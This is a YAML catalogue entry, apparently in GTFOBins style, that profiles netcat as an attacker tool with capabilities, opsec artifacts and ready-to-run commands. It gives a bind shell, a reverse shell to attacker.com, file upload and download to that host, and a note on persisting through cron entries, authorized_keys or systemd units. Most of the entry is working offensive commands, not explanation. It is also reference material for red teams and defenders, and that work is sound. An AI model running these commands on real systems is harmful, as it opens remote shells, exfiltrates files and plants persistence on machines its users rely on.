---
name: nc
capabilities:
- exec
- upload
- download
- bind
- reverse-shell
required_permissions:
  level: user
difficulty: low
opsec:
  noise: high
  artifacts:
  - ~/.bash_history
  - Network connection logs / firewall logs
  - auditd execve events
  - Process arguments visible in ps and auditd
  - Outbound network traffic to attacker host
  notes: ''
persistence_potential: true
examples:
- id: bind-shell
  description: Open a bind shell on a listening port.
  capabilities:
  - bind
  - exec
  command: nc -l -p 12345 -e /bin/sh
  notes: This only works with netcat traditional.
- id: download
  description: Fetch a remote file to disk.
  capabilities:
  - download
  command: nc -l -p 12345 >/path/to/output-file
  notes: The file is actually written by the invoking shell.
- id: download-2
  description: Fetch a remote file to disk.
  capabilities:
  - download
  command: nc attacker.com 12345 >/path/to/output-file
  notes: The file is actually written by the invoking shell.
- id: reverse-shell
  description: Initiate a reverse shell to attacker host.
  capabilities:
  - reverse-shell
  - exec
  command: nc -e /bin/sh attacker.com 12345
  notes: This only works with netcat traditional.
- id: upload
  description: Send a local file to a remote host.
  capabilities:
  - upload
  command: nc -l -p 12345 </path/to/input-file
  notes: The file is actually read by the invoking shell.
- id: upload-2
  description: Send a local file to a remote host.
  capabilities:
  - upload
  command: nc attacker.com 12345 </path/to/input-file
  notes: The file is actually read by the invoking shell.
references:
- https://gtfobins.github.io/gtfobins/nc/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
